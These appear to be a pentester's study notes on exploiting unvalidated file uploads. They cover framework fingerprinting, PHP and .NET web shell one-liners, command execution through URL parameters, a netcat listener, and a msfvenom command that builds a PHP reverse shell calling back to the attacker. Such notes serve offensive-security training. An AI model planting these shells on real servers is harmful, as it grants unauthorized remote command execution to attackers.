# Absent validation
- No validation at all
	- Clues: 
		- If click form to select a file, file selector dialog does not speccify any file type, as it says `All Files` for the file type
		- Web App does not mention anything about what file types allowed
		- Can drag and drop whatever we want
- Identify Web framework
	- First determine what language runs the web app
		- Web shell needs to be in the same language
		- Easy way to do this: visit `/index.ext` page
			- Swap out `ext` with things like `php`, `asp`, `aspx`
		- Fuzz the extension with Burp Intruder
		- Wappalyzer
		- Web scanners, eg. Burp/ZAP scanners
	- Upload a web shell and visit the site to execute

Webshells
- https://github.com/Arrexel/phpbash
- https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
- PHP One liners
	- `<?php system($_GET['cmd']); ?>
		- Only accepts in URL. ie
			- `shell.php?cmd=id`
	- `<?php system($_REQUEST['cmd']); ?>`
		- Also accepts in 
			- POST
				- cmd=id
			- Cookie
				- `Cookie: cmd=id`
- For .NET web apps, 
	- `<% eval request('cmd') %>`
- Note: web shell's don't always work, eg. if web server prevents use of some functions utilized by the webshell (eg. system())

**Take note of difference between ? and & use (just came from LFI module)**
- `/shell.php?cmd=id` when ? has not been used yet (first parameter)
- `/index.php?page=shell.php&cmd=id` since cmd is the SECOND parameter already

Reverse shell
- Pentest monkey PHP reverse shell
	- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
	- Remember to change the ip and port to our machine
- Then `nc -lvnp 80` as per normal
- Can do it with msfvenom as well
	- `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`
